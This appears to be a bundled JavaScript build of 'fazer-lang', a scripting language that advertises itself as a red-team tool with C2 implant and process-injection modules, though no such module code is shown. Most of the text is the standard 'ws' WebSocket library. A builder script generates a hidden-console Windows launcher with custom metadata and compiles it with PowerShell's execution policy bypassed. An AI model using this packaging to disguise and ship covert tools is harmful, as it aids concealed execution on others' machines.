            abortHandshake(websocket, socket, message);
            return;
          }
          let extensions;
          try {
            extensions = parse(secWebSocketExtensions);
          } catch (err) {
            const message = "Invalid Sec-WebSocket-Extensions header";
            abortHandshake(websocket, socket, message);
            return;
          }
          const extensionNames = Object.keys(extensions);
          if (extensionNames.length !== 1 || extensionNames[0] !== PerMessageDeflate.extensionName) {
            const message = "Server indicated an extension that was not requested";
            abortHandshake(websocket, socket, message);
            return;
          }
          try {
            perMessageDeflate.accept(extensions[PerMessageDeflate.extensionName]);
          } catch (err) {
            const message = "Invalid Sec-WebSocket-Extensions header";
            abortHandshake(websocket, socket, message);
            return;
          }
          websocket._extensions[PerMessageDeflate.extensionName] = perMessageDeflate;
        }
        websocket.setSocket(socket, head2, {
          allowSynchronousEvents: opts.allowSynchronousEvents,
          generateMask: opts.generateMask,
          maxPayload: opts.maxPayload,
          skipUTF8Validation: opts.skipUTF8Validation
        });
      });
      if (opts.finishRequest) {
        opts.finishRequest(req, websocket);
      } else {
        req.end();
      }
    }
    function emitErrorAndClose(websocket, err) {
      websocket._readyState = WebSocket.CLOSING;
      websocket._errorEmitted = true;
      websocket.emit("error", err);
      websocket.emitClose();
    }
    function netConnect(options) {
      options.path = options.socketPath;
      return net.connect(options);
    }
    function tlsConnect(options) {
      options.path = void 0;
      if (!options.servername && options.servername !== "") {
        options.servername = net.isIP(options.host) ? "" : options.host;
      }
      return tls.connect(options);
    }
    function abortHandshake(websocket, stream, message) {
      websocket._readyState = WebSocket.CLOSING;
      const err = new Error(message);
      Error.captureStackTrace(err, abortHandshake);
      if (stream.setHeader) {
        stream[kAborted] = true;
        stream.abort();
        if (stream.socket && !stream.socket.destroyed) {
          stream.socket.destroy();
        }
        process.nextTick(emitErrorAndClose, websocket, err);
      } else {
        stream.destroy(err);
        stream.once("error", websocket.emit.bind(websocket, "error"));
        stream.once("close", websocket.emitClose.bind(websocket));
      }
    }
    function sendAfterClose(websocket, data, cb) {
      if (data) {
        const length = isBlob(data) ? data.size : toBuffer(data).length;
        if (websocket._socket) websocket._sender._bufferedBytes += length;
        else websocket._bufferedAmount += length;
      }
      if (cb) {
        const err = new Error(
          `WebSocket is not open: readyState ${websocket.readyState} (${readyStates[websocket.readyState]})`
        );
        process.nextTick(cb, err);
      }
    }
    function receiverOnConclude(code2, reason) {
      const websocket = this[kWebSocket];
      websocket._closeFrameReceived = true;
      websocket._closeMessage = reason;
      websocket._closeCode = code2;
      if (websocket._socket[kWebSocket] === void 0) return;
      websocket._socket.removeListener("data", socketOnData);
      process.nextTick(resume, websocket._socket);
      if (code2 === 1005) websocket.close();
      else websocket.close(code2, reason);
    }
    function receiverOnDrain() {
      const websocket = this[kWebSocket];
      if (!websocket.isPaused) websocket._socket.resume();
    }
    function receiverOnError(err) {
      const websocket = this[kWebSocket];
      if (websocket._socket[kWebSocket] !== void 0) {
        websocket._socket.removeListener("data", socketOnData);
        process.nextTick(resume, websocket._socket);
        websocket.close(err[kStatusCode]);
      }
      if (!websocket._errorEmitted) {
        websocket._errorEmitted = true;
        websocket.emit("error", err);
      }
    }
    function receiverOnFinish() {
      this[kWebSocket].emitClose();
    }
    function receiverOnMessage(data, isBinary) {
      this[kWebSocket].emit("message", data, isBinary);
    }
    function receiverOnPing(data) {
      const websocket = this[kWebSocket];
      if (websocket._autoPong) websocket.pong(data, !this._isServer, NOOP);
      websocket.emit("ping", data);
    }
    function receiverOnPong(data) {
      this[kWebSocket].emit("pong", data);
    }
    function resume(stream) {
      stream.resume();
    }
    function senderOnError(err) {
      const websocket = this[kWebSocket];
      if (websocket.readyState === WebSocket.CLOSED) return;
      if (websocket.readyState === WebSocket.OPEN) {
        websocket._readyState = WebSocket.CLOSING;
        setCloseTimer(websocket);
      }
      this._socket.end();
      if (!websocket._errorEmitted) {
        websocket._errorEmitted = true;
        websocket.emit("error", err);
      }
    }
    function setCloseTimer(websocket) {
      websocket._closeTimer = setTimeout(
        websocket._socket.destroy.bind(websocket._socket),
        websocket._closeTimeout
      );
    }
    function socketOnClose() {
      const websocket = this[kWebSocket];
      this.removeListener("close", socketOnClose);
      this.removeListener("data", socketOnData);
      this.removeListener("end", socketOnEnd);
      websocket._readyState = WebSocket.CLOSING;
      if (!this._readableState.endEmitted && !websocket._closeFrameReceived && !websocket._receiver._writableState.errorEmitted && this._readableState.length !== 0) {
        const chunk = this.read(this._readableState.length);
        websocket._receiver.write(chunk);
      }
      websocket._receiver.end();
      this[kWebSocket] = void 0;
      clearTimeout(websocket._closeTimer);
      if (websocket._receiver._writableState.finished || websocket._receiver._writableState.errorEmitted) {
        websocket.emitClose();
      } else {
        websocket._receiver.on("error", receiverOnFinish);
        websocket._receiver.on("finish", receiverOnFinish);
      }
    }
    function socketOnData(chunk) {
      if (!this[kWebSocket]._receiver.write(chunk)) {
        this.pause();
      }
    }
    function socketOnEnd() {
      const websocket = this[kWebSocket];
      websocket._readyState = WebSocket.CLOSING;
      websocket._receiver.end();
      this.end();
    }
    function socketOnError() {
      const websocket = this[kWebSocket];
      this.removeListener("error", socketOnError);
      this.on("error", NOOP);
      if (websocket) {
        websocket._readyState = WebSocket.CLOSING;
        this.destroy();
      }
    }
  }
});

// node_modules/ws/lib/stream.js
var require_stream = __commonJS({
  "node_modules/ws/lib/stream.js"(exports2, module2) {
    "use strict";
    var WebSocket = require_websocket();
    var { Duplex } = require("stream");
    function emitClose(stream) {
      stream.emit("close");
    }
    function duplexOnEnd() {
      if (!this.destroyed && this._writableState.finished) {
        this.destroy();
      }
    }
    function duplexOnError(err) {
      this.removeListener("error", duplexOnError);
      this.destroy();
      if (this.listenerCount("error") === 0) {
        this.emit("error", err);
      }
    }
    function createWebSocketStream(ws, options) {
      let terminateOnDestroy = true;
      const duplex = new Duplex({
        ...options,
        autoDestroy: false,
        emitClose: false,
        objectMode: false,
        writableObjectMode: false
      });
      ws.on("message", function message(msg, isBinary) {
        const data = !isBinary && duplex._readableState.objectMode ? msg.toString() : msg;
        if (!duplex.push(data)) ws.pause();
      });
      ws.once("error", function error(err) {
        if (duplex.destroyed) return;
        terminateOnDestroy = false;
        duplex.destroy(err);
      });
      ws.once("close", function close() {
        if (duplex.destroyed) return;
        duplex.push(null);
      });
      duplex._destroy = function(err, callback) {
        if (ws.readyState === ws.CLOSED) {
          callback(err);
          process.nextTick(emitClose, duplex);
          return;
        }
        let called = false;
        ws.once("error", function error(err2) {
          called = true;
          callback(err2);
        });
        ws.once("close", function close() {
          if (!called) callback(err);
          process.nextTick(emitClose, duplex);
        });
        if (terminateOnDestroy) ws.terminate();
      };
      duplex._final = function(callback) {
        if (ws.readyState === ws.CONNECTING) {
          ws.once("open", function open() {
            duplex._final(callback);
          });
          return;
        }
        if (ws._socket === null) return;
        if (ws._socket._writableState.finished) {
          callback();
          if (duplex._readableState.endEmitted) duplex.destroy();
        } else {
          ws._socket.once("finish", function finish() {
            callback();
          });
          ws.close();
        }
      };
      duplex._read = function() {
        if (ws.isPaused) ws.resume();
      };
      duplex._write = function(chunk, encoding, callback) {
        if (ws.readyState === ws.CONNECTING) {
          ws.once("open", function open() {
            duplex._write(chunk, encoding, callback);
          });
          return;
        }
        ws.send(chunk, callback);
      };
      duplex.on("end", duplexOnEnd);
      duplex.on("error", duplexOnError);
      return duplex;
    }
    module2.exports = createWebSocketStream;
  }
});

// node_modules/ws/lib/subprotocol.js
var require_subprotocol = __commonJS({
  "node_modules/ws/lib/subprotocol.js"(exports2, module2) {
    "use strict";
    var { tokenChars } = require_validation();
    function parse(header) {
      const protocols = /* @__PURE__ */ new Set();
      let start = -1;
      let end = -1;
      let i = 0;
      for (i; i < header.length; i++) {
        const code2 = header.charCodeAt(i);
        if (end === -1 && tokenChars[code2] === 1) {
          if (start === -1) start = i;
        } else if (i !== 0 && (code2 === 32 || code2 === 9)) {
          if (end === -1 && start !== -1) end = i;
        } else if (code2 === 44) {
          if (start === -1) {
            throw new SyntaxError(`Unexpected character at index ${i}`);
          }
          if (end === -1) end = i;
          const protocol2 = header.slice(start, end);
          if (protocols.has(protocol2)) {
            throw new SyntaxError(`The "${protocol2}" subprotocol is duplicated`);
          }
          protocols.add(protocol2);
          start = end = -1;
        } else {
          throw new SyntaxError(`Unexpected character at index ${i}`);
        }
      }
      if (start === -1 || end !== -1) {
        throw new SyntaxError("Unexpected end of input");
      }
      const protocol = header.slice(start, i);
      if (protocols.has(protocol)) {
        throw new SyntaxError(`The "${protocol}" subprotocol is duplicated`);
      }
      protocols.add(protocol);
      return protocols;
    }
    module2.exports = { parse };
  }
});

// node_modules/ws/lib/websocket-server.js
var require_websocket_server = __commonJS({
  "node_modules/ws/lib/websocket-server.js"(exports2, module2) {
    "use strict";
    var EventEmitter = require("events");
    var http2 = require("http");
    var { Duplex } = require("stream");
    var { createHash } = require("crypto");
    var extension = require_extension();
    var PerMessageDeflate = require_permessage_deflate();
    var subprotocol = require_subprotocol();
    var WebSocket = require_websocket();
    var { CLOSE_TIMEOUT, GUID, kWebSocket } = require_constants();
    var keyRegex = /^[+/0-9A-Za-z]{22}==$/;
    var RUNNING = 0;
    var CLOSING = 1;
    var CLOSED = 2;
    var WebSocketServer = class extends EventEmitter {
      /**
       * Create a `WebSocketServer` instance.
       *
       * @param {Object} options Configuration options
       * @param {Boolean} [options.allowSynchronousEvents=true] Specifies whether
       *     any of the `'message'`, `'ping'`, and `'pong'` events can be emitted
       *     multiple times in the same tick
       * @param {Boolean} [options.autoPong=true] Specifies whether or not to
       *     automatically send a pong in response to a ping
       * @param {Number} [options.backlog=511] The maximum length of the queue of
       *     pending connections
       * @param {Boolean} [options.clientTracking=true] Specifies whether or not to
       *     track clients
       * @param {Number} [options.closeTimeout=30000] Duration in milliseconds to
       *     wait for the closing handshake to finish after `websocket.close()` is
       *     called
       * @param {Function} [options.handleProtocols] A hook to handle protocols
       * @param {String} [options.host] The hostname where to bind the server
       * @param {Number} [options.maxPayload=104857600] The maximum allowed message
       *     size
       * @param {Boolean} [options.noServer=false] Enable no server mode
       * @param {String} [options.path] Accept only connections matching this path
       * @param {(Boolean|Object)} [options.perMessageDeflate=false] Enable/disable
       *     permessage-deflate
       * @param {Number} [options.port] The port where to bind the server
       * @param {(http.Server|https.Server)} [options.server] A pre-created HTTP/S
       *     server to use
       * @param {Boolean} [options.skipUTF8Validation=false] Specifies whether or
       *     not to skip UTF-8 validation for text and close messages
       * @param {Function} [options.verifyClient] A hook to reject connections
       * @param {Function} [options.WebSocket=WebSocket] Specifies the `WebSocket`
       *     class to use. It must be the `WebSocket` class or class that extends it
       * @param {Function} [callback] A listener for the `listening` event
       */
      constructor(options, callback) {
        super();
        options = {
          allowSynchronousEvents: true,
          autoPong: true,
          maxPayload: 100 * 1024 * 1024,
          skipUTF8Validation: false,
          perMessageDeflate: false,
          handleProtocols: null,
          clientTracking: true,
          closeTimeout: CLOSE_TIMEOUT,
          verifyClient: null,
          noServer: false,
          backlog: null,
          // use default (511 as implemented in net.js)
          server: null,
          host: null,
          path: null,
          port: null,
          WebSocket,
          ...options
        };
        if (options.port == null && !options.server && !options.noServer || options.port != null && (options.server || options.noServer) || options.server && options.noServer) {
          throw new TypeError(
            'One and only one of the "port", "server", or "noServer" options must be specified'
          );
        }
        if (options.port != null) {
          this._server = http2.createServer((req, res) => {
            const body = http2.STATUS_CODES[426];
            res.writeHead(426, {
              "Content-Length": body.length,
              "Content-Type": "text/plain"
            });
            res.end(body);
          });
          this._server.listen(
            options.port,
            options.host,
            options.backlog,
            callback
          );
        } else if (options.server) {
          this._server = options.server;
        }
        if (this._server) {
          const emitConnection = this.emit.bind(this, "connection");
          this._removeListeners = addListeners(this._server, {
            listening: this.emit.bind(this, "listening"),
            error: this.emit.bind(this, "error"),
            upgrade: (req, socket, head2) => {
              this.handleUpgrade(req, socket, head2, emitConnection);
            }
          });
        }
        if (options.perMessageDeflate === true) options.perMessageDeflate = {};
        if (options.clientTracking) {
          this.clients = /* @__PURE__ */ new Set();
          this._shouldEmitClose = false;
        }
        this.options = options;
        this._state = RUNNING;
      }
      /**
       * Returns the bound address, the address family name, and port of the server
       * as reported by the operating system if listening on an IP socket.
       * If the server is listening on a pipe or UNIX domain socket, the name is
       * returned as a string.
       *
       * @return {(Object|String|null)} The address of the server
       * @public
       */
      address() {
        if (this.options.noServer) {
          throw new Error('The server is operating in "noServer" mode');
        }
        if (!this._server) return null;
        return this._server.address();
      }
      /**
       * Stop the server from accepting new connections and emit the `'close'` event
       * when all existing connections are closed.
       *
       * @param {Function} [cb] A one-time listener for the `'close'` event
       * @public
       */
      close(cb) {
        if (this._state === CLOSED) {
          if (cb) {
            this.once("close", () => {
              cb(new Error("The server is not running"));
            });
          }
          process.nextTick(emitClose, this);
          return;
        }
        if (cb) this.once("close", cb);
        if (this._state === CLOSING) return;
        this._state = CLOSING;
        if (this.options.noServer || this.options.server) {
          if (this._server) {
            this._removeListeners();
            this._removeListeners = this._server = null;
          }
          if (this.clients) {
            if (!this.clients.size) {
              process.nextTick(emitClose, this);
            } else {
              this._shouldEmitClose = true;
            }
          } else {
            process.nextTick(emitClose, this);
          }
        } else {
          const server = this._server;
          this._removeListeners();
          this._removeListeners = this._server = null;
          server.close(() => {
            emitClose(this);
          });
        }
      }
      /**
       * See if a given request should be handled by this server instance.
       *
       * @param {http.IncomingMessage} req Request object to inspect
       * @return {Boolean} `true` if the request is valid, else `false`
       * @public
       */
      shouldHandle(req) {
        if (this.options.path) {
          const index = req.url.indexOf("?");
          const pathname = index !== -1 ? req.url.slice(0, index) : req.url;
          if (pathname !== this.options.path) return false;
        }
        return true;
      }
      /**
       * Handle a HTTP Upgrade request.
       *
       * @param {http.IncomingMessage} req The request object
       * @param {Duplex} socket The network socket between the server and client
       * @param {Buffer} head The first packet of the upgraded stream
       * @param {Function} cb Callback
       * @public
       */
      handleUpgrade(req, socket, head2, cb) {
        socket.on("error", socketOnError);
        const key = req.headers["sec-websocket-key"];
        const upgrade = req.headers.upgrade;
        const version = +req.headers["sec-websocket-version"];
        if (req.method !== "GET") {
          const message = "Invalid HTTP method";
          abortHandshakeOrEmitwsClientError(this, req, socket, 405, message);
          return;
        }
        if (upgrade === void 0 || upgrade.toLowerCase() !== "websocket") {
          const message = "Invalid Upgrade header";
          abortHandshakeOrEmitwsClientError(this, req, socket, 400, message);
          return;
        }
        if (key === void 0 || !keyRegex.test(key)) {
          const message = "Missing or invalid Sec-WebSocket-Key header";
          abortHandshakeOrEmitwsClientError(this, req, socket, 400, message);
          return;
        }
        if (version !== 13 && version !== 8) {
          const message = "Missing or invalid Sec-WebSocket-Version header";
          abortHandshakeOrEmitwsClientError(this, req, socket, 400, message, {
            "Sec-WebSocket-Version": "13, 8"
          });
          return;
        }
        if (!this.shouldHandle(req)) {
          abortHandshake(socket, 400);
          return;
        }
        const secWebSocketProtocol = req.headers["sec-websocket-protocol"];
        let protocols = /* @__PURE__ */ new Set();
        if (secWebSocketProtocol !== void 0) {
          try {
            protocols = subprotocol.parse(secWebSocketProtocol);
          } catch (err) {
            const message = "Invalid Sec-WebSocket-Protocol header";
            abortHandshakeOrEmitwsClientError(this, req, socket, 400, message);
            return;
          }
        }
        const secWebSocketExtensions = req.headers["sec-websocket-extensions"];
        const extensions = {};
        if (this.options.perMessageDeflate && secWebSocketExtensions !== void 0) {
          const perMessageDeflate = new PerMessageDeflate(
            this.options.perMessageDeflate,
            true,
            this.options.maxPayload
          );
          try {
            const offers = extension.parse(secWebSocketExtensions);
            if (offers[PerMessageDeflate.extensionName]) {
              perMessageDeflate.accept(offers[PerMessageDeflate.extensionName]);
              extensions[PerMessageDeflate.extensionName] = perMessageDeflate;
            }
          } catch (err) {
            const message = "Invalid or unacceptable Sec-WebSocket-Extensions header";
            abortHandshakeOrEmitwsClientError(this, req, socket, 400, message);
            return;
          }
        }
        if (this.options.verifyClient) {
          const info = {
            origin: req.headers[`${version === 8 ? "sec-websocket-origin" : "origin"}`],
            secure: !!(req.socket.authorized || req.socket.encrypted),
            req
          };
          if (this.options.verifyClient.length === 2) {
            this.options.verifyClient(info, (verified, code2, message, headers) => {
              if (!verified) {
                return abortHandshake(socket, code2 || 401, message, headers);
              }
              this.completeUpgrade(
                extensions,
                key,
                protocols,
                req,
                socket,
                head2,
                cb
              );
            });
            return;
          }
          if (!this.options.verifyClient(info)) return abortHandshake(socket, 401);
        }
        this.completeUpgrade(extensions, key, protocols, req, socket, head2, cb);
      }
      /**
       * Upgrade the connection to WebSocket.
       *
       * @param {Object} extensions The accepted extensions
       * @param {String} key The value of the `Sec-WebSocket-Key` header
       * @param {Set} protocols The subprotocols
       * @param {http.IncomingMessage} req The request object
       * @param {Duplex} socket The network socket between the server and client
       * @param {Buffer} head The first packet of the upgraded stream
       * @param {Function} cb Callback
       * @throws {Error} If called more than once with the same socket
       * @private
       */
      completeUpgrade(extensions, key, protocols, req, socket, head2, cb) {
        if (!socket.readable || !socket.writable) return socket.destroy();
        if (socket[kWebSocket]) {
          throw new Error(
            "server.handleUpgrade() was called more than once with the same socket, possibly due to a misconfiguration"
          );
        }
        if (this._state > RUNNING) return abortHandshake(socket, 503);
        const digest = createHash("sha1").update(key + GUID).digest("base64");
        const headers = [
          "HTTP/1.1 101 Switching Protocols",
          "Upgrade: websocket",
          "Connection: Upgrade",
          `Sec-WebSocket-Accept: ${digest}`
        ];
        const ws = new this.options.WebSocket(null, void 0, this.options);
        if (protocols.size) {
          const protocol = this.options.handleProtocols ? this.options.handleProtocols(protocols, req) : protocols.values().next().value;
          if (protocol) {
            headers.push(`Sec-WebSocket-Protocol: ${protocol}`);
            ws._protocol = protocol;
          }
        }
        if (extensions[PerMessageDeflate.extensionName]) {
          const params = extensions[PerMessageDeflate.extensionName].params;
          const value = extension.format({
            [PerMessageDeflate.extensionName]: [params]
          });
          headers.push(`Sec-WebSocket-Extensions: ${value}`);
          ws._extensions = extensions;
        }
        this.emit("headers", headers, req);
        socket.write(headers.concat("\r\n").join("\r\n"));
        socket.removeListener("error", socketOnError);
        ws.setSocket(socket, head2, {
          allowSynchronousEvents: this.options.allowSynchronousEvents,
          maxPayload: this.options.maxPayload,
          skipUTF8Validation: this.options.skipUTF8Validation
        });
        if (this.clients) {
          this.clients.add(ws);
          ws.on("close", () => {
            this.clients.delete(ws);
            if (this._shouldEmitClose && !this.clients.size) {
              process.nextTick(emitClose, this);
            }
          });
        }
        cb(ws, req);
      }
    };
    module2.exports = WebSocketServer;
    function addListeners(server, map2) {
      for (const event of Object.keys(map2)) server.on(event, map2[event]);
      return function removeListeners() {
        for (const event of Object.keys(map2)) {
          server.removeListener(event, map2[event]);
        }
      };
    }
    function emitClose(server) {
      server._state = CLOSED;
      server.emit("close");
    }
    function socketOnError() {
      this.destroy();
    }
    function abortHandshake(socket, code2, message, headers) {
      message = message || http2.STATUS_CODES[code2];
      headers = {
        Connection: "close",
        "Content-Type": "text/html",
        "Content-Length": Buffer.byteLength(message),
        ...headers
      };
      socket.once("finish", socket.destroy);
      socket.end(
        `HTTP/1.1 ${code2} ${http2.STATUS_CODES[code2]}\r
` + Object.keys(headers).map((h) => `${h}: ${headers[h]}`).join("\r\n") + "\r\n\r\n" + message
      );
    }
    function abortHandshakeOrEmitwsClientError(server, req, socket, code2, message, headers) {
      if (server.listenerCount("wsClientError")) {
        const err = new Error(message);
        Error.captureStackTrace(err, abortHandshakeOrEmitwsClientError);
        server.emit("wsClientError", err, socket, req);
      } else {
        abortHandshake(socket, code2, message, headers);
      }
    }
  }
});

// node_modules/ws/index.js
var require_ws = __commonJS({
  "node_modules/ws/index.js"(exports2, module2) {
    "use strict";
    var WebSocket = require_websocket();
    WebSocket.createWebSocketStream = require_stream();
    WebSocket.Server = require_websocket_server();
    WebSocket.Receiver = require_receiver();
    WebSocket.Sender = require_sender();
    WebSocket.WebSocket = WebSocket;
    WebSocket.WebSocketServer = WebSocket.Server;
    module2.exports = WebSocket;
  }
});

// package.json
var require_package = __commonJS({
  "package.json"(exports2, module2) {
    module2.exports = {
      name: "fazer-lang",
      version: "4.0.1",
      description: "Fazer \u2014 The Red Team Language. Native modules for C2 Implant, WiFi Recon, Steganography (LSB), Process Injection, Crypto, 3D Game Engine, and Automation. Secure, powerful, standalone.",
      main: "fazer.js",
      types: "index.d.ts",
      bin: {
        fazer: "fazer.js"
      },
      files: [
        "fazer.js",
        "index.d.ts",
        "README.md",
        "CHANGELOG.md",
        "LICENSE",
        "docs/",
        "tools/",
        "lib/"
      ],
      dependencies: {
        chevrotain: "^11.0.3",
        ws: "^8.18.0"
      },
      devDependencies: {
        esbuild: "^0.27.2"
      },
      scripts: {
        start: "node fazer.js",
        test: "node fazer.js --version",
        build: "echo 'No build step required for JS interpreter'",
        prepublishOnly: "npm test"
      },
      keywords: [
        "fazer",
        "language",
        "scripting",
        "interpreter",
        "pipe-operator",
        "functional",
        "secure",
        "automation",
        "http-server",
        "system-automation"
      ],
      author: "Viced",
      license: "MIT",
      repository: {
        type: "git",
        url: "git+https://github.com/viced-1920/fazer-lang.git"
      },
      bugs: {
        url: "https://github.com/viced-1920/fazer-lang/issues"
      },
      homepage: "https://github.com/viced-1920/fazer-lang#readme"
    };
  }
});

// tools/builder.js
var require_builder = __commonJS({
  "tools/builder.js"(exports2, module2) {
    var fs2 = require("fs");
    var path2 = require("path");
    var { execSync } = require("child_process");
    function log(msg) {
      console.log(`[Fazer Build] ${msg}`);
    }
    function error(msg) {
      console.error(`[Error] ${msg}`);
      process.exit(1);
    }
    var build = async function(inputFile, args2) {
      if (!inputFile) error("No input file specified. Usage: fazer build <app.fz>");
      const inputPath = path2.resolve(inputFile);
      if (!fs2.existsSync(inputPath)) error(`Input file not found: ${inputPath}`);
      const appName = path2.basename(inputFile, ".fz");
      const distDir = path2.resolve(process.cwd(), "dist", appName);
      let iconPath = null;
      let uiPath = null;
      let meta = {
        title: appName,
        desc: "Fazer Application",
        company: "Fazer",
        product: appName,
        copyright: `Copyright (c) ${(/* @__PURE__ */ new Date()).getFullYear()}`,
        version: "1.0.0.0"
      };
      for (let i = 0; i < args2.length; i++) {
        if (args2[i] === "--icon" && args2[i + 1]) {
          iconPath = path2.resolve(args2[i + 1]);
          i++;
        }
        if (args2[i] === "--ui" && args2[i + 1]) {
          uiPath = path2.resolve(args2[i + 1]);
          i++;
        }
        if (args2[i] === "--title" && args2[i + 1]) {
          meta.title = args2[i + 1];
          i++;
        }
        if (args2[i] === "--desc" && args2[i + 1]) {
          meta.desc = args2[i + 1];
          i++;
        }
        if (args2[i] === "--company" && args2[i + 1]) {
          meta.company = args2[i + 1];
          i++;
        }
        if (args2[i] === "--product" && args2[i + 1]) {
          meta.product = args2[i + 1];
          i++;
        }
        if (args2[i] === "--copyright" && args2[i + 1]) {
          meta.copyright = args2[i + 1];
          i++;
        }
        if (args2[i] === "--version" && args2[i + 1]) {
          meta.version = args2[i + 1];
          i++;
        }
      }
      log(`Building '${appName}'...`);
      log(`Output Directory: ${distDir}`);
      if (fs2.existsSync(distDir)) {
        fs2.rmSync(distDir, { recursive: true, force: true });
      }
      fs2.mkdirSync(distDir, { recursive: true });
      const fazerRoot = path2.dirname(__dirname);
      const fazerJsPath = path2.join(fazerRoot, "fazer.js");
      fs2.copyFileSync(fazerJsPath, path2.join(distDir, "fazer.js"));
      fs2.copyFileSync(inputPath, path2.join(distDir, "app.fz"));
      if (uiPath && fs2.existsSync(uiPath)) {
        log(`Bundling UI assets from: ${uiPath}`);
        fs2.cpSync(uiPath, path2.join(distDir, "ui"), { recursive: true });
      }
      const nodeModulesSrc = path2.join(fazerRoot, "node_modules");
      if (fs2.existsSync(nodeModulesSrc)) {
        log("Copying dependencies...");
        try {
          fs2.cpSync(nodeModulesSrc, path2.join(distDir, "node_modules"), { recursive: true });
        } catch (e) {
          log("Warning: Failed to copy node_modules.");
        }
      }
      const isWin = process.platform === "win32";
      log(`Generating Launcher for ${process.platform}...`);
      if (isWin) {
        const launcherCs = `
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

// Metadata
[assembly: AssemblyTitle("${meta.title}")]
[assembly: AssemblyDescription("${meta.desc}")]
[assembly: AssemblyCompany("${meta.company}")]
[assembly: AssemblyProduct("${meta.product}")]
[assembly: AssemblyCopyright("${meta.copyright}")]
[assembly: AssemblyFileVersion("${meta.version}")]
[assembly: AssemblyVersion("${meta.version}")]

class Program {
    [STAThread]
    static void Main() {
        string appDir = AppDomain.CurrentDomain.BaseDirectory;
        string script = Path.Combine(appDir, "fazer.js");
        string app = Path.Combine(appDir, "app.fz");
        
        // Check if we have bundled node or rely on PATH
        string nodeExe = "node";
        if (File.Exists(Path.Combine(appDir, "node.exe"))) {
            nodeExe = Path.Combine(appDir, "node.exe");
        }

        string extraArgs = "";
        string[] cmdArgs = Environment.GetCommandLineArgs();
        for (int i = 1; i < cmdArgs.Length; i++) {
            extraArgs += " \\"" + cmdArgs[i] + "\\"";
        }

        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = nodeExe;
        psi.Arguments = "\\"" + script + "\\" \\"" + app + "\\" " + extraArgs;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true; // Hidden console
        psi.WindowStyle = ProcessWindowStyle.Hidden;

        try {
            Process.Start(psi);
        } catch (Exception e) {
            MessageBox.Show("Failed to launch Fazer App:\\n" + e.Message + "\\n\\nEnsure Node.js is installed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
        `;
        const csPath = path2.join(distDir, "Launcher.cs");
        fs2.writeFileSync(csPath, launcherCs);
        const exeName = `${appName}.exe`;
        const exePath = path2.join(distDir, exeName);
        let iconArg = "";
        if (iconPath && fs2.existsSync(iconPath)) {
          const distIcon = path2.join(distDir, "app.ico");
          fs2.copyFileSync(iconPath, distIcon);
          iconArg = `-Win32Icon "${distIcon}"`;
        }
        log("Compiling EXE...");
        const psScript = `
        $csc = (Get-ChildItem -Path "$env:windir\\Microsoft.NET\\Framework64\\v4*" -Filter csc.exe | Select-Object -Last 1).FullName
        if (-not $csc) {
            $csc = (Get-ChildItem -Path "$env:windir\\Microsoft.NET\\Framework\\v4*" -Filter csc.exe | Select-Object -Last 1).FullName
        }
        
        if ($csc) {
            Write-Host "Compiling with CSC: $csc"
            $args = @("/target:winexe", "/out:${exePath}", "${csPath}")
            if ("${iconArg}") { $args += "/win32icon:${path2.join(distDir, "app.ico")}" }
            & $csc $args
        } else {
            Write-Error "CSC.exe not found. Cannot compile."
            exit 1
        }
        `;
        const psBuildPath = path2.join(distDir, "build_exe.ps1");
        fs2.writeFileSync(psBuildPath, psScript);
        try {
          execSync(`powershell -ExecutionPolicy Bypass -File "${psBuildPath}"`, { stdio: "inherit" });
        } catch (e) {
          log("Compilation failed.");
          return;
        }
        if (fs2.existsSync(exePath)) {
          fs2.unlinkSync(csPath);
          fs2.unlinkSync(psBuildPath);
          log("Build Success!");
          log(`Created: ${exePath}`);
        } else {
          error("EXE file was not created.");
        }
      } else {
        const launcherSh = `#!/bin/bash
DIR="$( cd "$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
# Use embedded node if available, else system node
if [ -f "$DIR/node" ]; then
    NODE="$DIR/node"
else
    NODE="node"
fi

"$NODE" "$DIR/fazer.js" "$DIR/app.fz" "$@"
`;
        const shPath = path2.join(distDir, appName);
        fs2.writeFileSync(shPath, launcherSh);
        fs2.chmodSync(shPath, 493);
        log("Build Success!");
        log(`Created: ${shPath}`);
        log("You can now zip the folder '${distDir}' and share it.");
      }
    };
    module2.exports = build;
    if (require.main === module2) {
      const args2 = process.argv.slice(2);
      if (args2.length < 1) {
        console.error("Usage: node builder.js <app.fz> [options]");
        process.exit(1);
      }
      const file = args2[0];
      const rest = args2.slice(1);
      build(file, rest);
    }
  }
});

// fazer.js
var fs = require("fs");
var path = require("path");
var crypto = require("crypto");
var os = require("os");
var child_process = require("child_process");
var http = require("http");
var https = require("https");
var fetchWithRedirects = (url, opts = {}, maxRedirects = 5) => {
  return new Promise((resolve, reject2) => {
    if (maxRedirects === 0) return resolve({ status: 310, body: "Too many redirects", headers: {} });
    const isHttp = url.startsWith("http:");
    const mod = isHttp ? http : https;
    const headers = opts.headers || {};
    let body = opts.body;
    if (body) {
      if (typeof body === "object" && !Buffer.isBuffer(body)) {
        try {
          body = JSON.stringify(body);
          const hasType = Object.keys(headers).some((k) => k.toLowerCase() === "content-type");
          if (!hasType) headers["Content-Type"] = "application/json";
        } catch (e) {
          body = String(body);
        }
      } else if (typeof body !== "string" && !Buffer.isBuffer(body)) {
        body = String(body);
      }
    }
    const options = { method: opts.method || "GET", headers };
    const req = mod.request(url, options, (res) => {
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        try {
          const redirectUrl = new URL(res.headers.location, url).href;
          fetchWithRedirects(redirectUrl, opts, maxRedirects - 1).then(resolve);
          return;
        } catch (e) {
        }
      }
      let data = "";
      res.on("data", (chunk) => data += chunk);
      res.on("end", () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
    });
    req.on("error", (e) => resolve({ status: 0, body: "", error: e.message }));
    if (body) {
      req.write(body);
    }
    req.end();
  });
};
process.on("uncaughtException", (err) => {
  console.error("\n\n[FATAL ERROR] Uncaught Exception:", err);
  console.error("Press Ctrl+C to exit...");
  setInterval(() => {
  }, 1e3);
});
process.on("unhandledRejection", (reason, promise) => {
  console.error("\n\n[FATAL ERROR] Unhandled Rejection:", reason);
});
var { Lexer, createToken, EmbeddedActionsParser } = (init_api5(), __toCommonJS(api_exports));
var WhiteSpace = createToken({ name: "WhiteSpace", pattern: /[ \t\r\n]+/, group: Lexer.SKIPPED });
